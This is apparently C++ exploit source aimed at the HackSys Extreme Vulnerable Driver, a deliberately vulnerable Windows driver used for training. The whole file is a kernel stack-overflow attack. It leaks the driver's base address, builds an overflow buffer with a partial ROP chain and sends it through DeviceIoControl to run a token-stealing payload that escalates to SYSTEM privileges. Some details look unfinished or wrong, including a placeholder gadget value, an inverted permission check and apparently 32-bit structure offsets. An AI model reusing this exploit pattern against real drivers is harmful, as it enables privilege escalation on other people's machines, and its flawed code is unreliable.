// exploitHEVDStackOverflow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include <tchar.h>
extern "C" void TokenStealingPayloadWin11();

#define GLE( x ) { printf("%s failed with error: %d\n", x , GetLastError()); }
#define IOCTL 0x222003
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID


LPVOID getModule(TCHAR target[1024])
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[1024];

		cDrivers = cbNeeded / sizeof(drivers[0]);

		_tprintf(TEXT("There are %d drivers:\n"), cDrivers);
		for (i = 0; i < cDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{
				_tprintf(TEXT("%d: %s\n"), i + 1, szDriver);
				std::cout << drivers[i] << "\n";
				if (szDriver[0] == target[0])
				{
					if (szDriver[1] == target[1])
					{
						_tprintf(TEXT("[+] Found the address: "));
						std::cout << drivers[i] << "\n";
						return drivers[i];
					}
				}
			}
		}
	}
	else
	{
		_tprintf(TEXT("EnumDeviceDrivers failed; array size needed is %d\n"), cbNeeded / sizeof(LPVOID));
		return 0;
	}

	return 0;
}

void test()
{
	__debugbreak;
	LPCSTR app = "cmd.exe";
	CreateProcessA(app, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, NULL, NULL);
}


void buildROP(PVOID MemoryAddress, PVOID baseAddr, PVOID payload)
{
	/*
	0x40 flprotect
	0x00001000 flallocationType
	0x01
	bufferAddr
	Kernel32!VirtualALlocStud
	*
	*
	85ada: mov eax,  [rsp+0x04] ; add rsp, 0x18 ; ret ;
	88bd9: call qword [rax+0x08] ;
	85750: pop rax ; ret ;
	85552: push rax ; pop rdi ; ret ;

	*(PULONG64)MemoryAddress = (ULONG64)baseAddr + 0x11ac; //virtualAlloc
	*(PULONG64)MemoryAddress += sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)baseAddr + (sizeof(ULONG64)*5); //bufferAddr
	*(PULONG64)MemoryAddress += sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)0x01; //0x01 dwSize
	*(PULONG64)MemoryAddress += sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)0x00001000; //0x00001000 flallocationType
	*(PULONG64)MemoryAddress += sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)0x40; //0x40 flprotect
	*/

	*(PULONG64)MemoryAddress = (ULONG64)baseAddr + 0x85750; //pop rax
	MemoryAddress = static_cast<char*>(MemoryAddress) + sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)0x4242424242424242; //bufferAdd
	MemoryAddress = static_cast<char*>(MemoryAddress) + sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)payload;
}

void triggerOverflow(HANDLE hDevice)
{
	//ret at offset 2072
	//const char we [] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9CAAAA";
	SIZE_T UserModeBufferSize = (400) * sizeof(ULONG64);
	//SIZE_T UserModeBufferSize = strlen(we);
	PULONG UserModeBuffer = NULL;
	PVOID payload = &TokenStealingPayloadWin11;
	TCHAR target [1024] = L"HEVD.sys";
	puts("[+] \"Leaking\" module address...");
	PVOID baseAddr = getModule(target);
	std::cout << baseAddr << "\n";
	if (!baseAddr)
	{
		puts("[-] Failed to find base module address, aborting...");
		return;
	}

	UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		UserModeBufferSize);
	RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);
	PVOID MemoryAddress = (PVOID)(((ULONG64)UserModeBuffer + 2072));
	//first ROP gadget
	//*(PULONG64)MemoryAddress = (ULONG64)payload;
	buildROP(MemoryAddress, baseAddr, payload);
	//RtlCopyMemory((PVOID)UserModeBuffer, we, UserModeBufferSize);
	puts("Payload located at:");
	std::cout << payload << "\n";
	DWORD64 dummy = 0;
	PDWORD test = 0;
	DWORD dwBytesReturned = 0;
	puts("[+] Changing page permissions to RWE...");
	if (VirtualProtect(payload, UserModeBufferSize, PAGE_EXECUTE_READWRITE, test))
	{
		puts("[-] Failed to change page permissions...");
	}
	puts("[+] Triggering buffer overflow... Press any key to continue...");
	getchar();
	NTSTATUS status = DeviceIoControl(
		hDevice, //hDevice
		IOCTL, //dwIoControlCode
		(LPVOID)UserModeBuffer,
		(DWORD)UserModeBufferSize,
		&dummy, //lpOutBuffer
		sizeof(dummy), //nOutBufferSize
		&dwBytesReturned,  //lpBytesReturned
		NULL  //lpOverlapped
	);
}


int main()
{

	puts("[+] Opening handle to device");
	const char* devName = "\\\\.\\HackSysExtremeVulnerableDriver";
    HANDLE hFile = CreateFileA(devName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == (HANDLE)0 || hFile == INVALID_HANDLE_VALUE) {
		GLE("CreateFileA");
		return -1;
	}
	
	puts("[+] Opened handle to device");
	triggerOverflow(hFile);

}
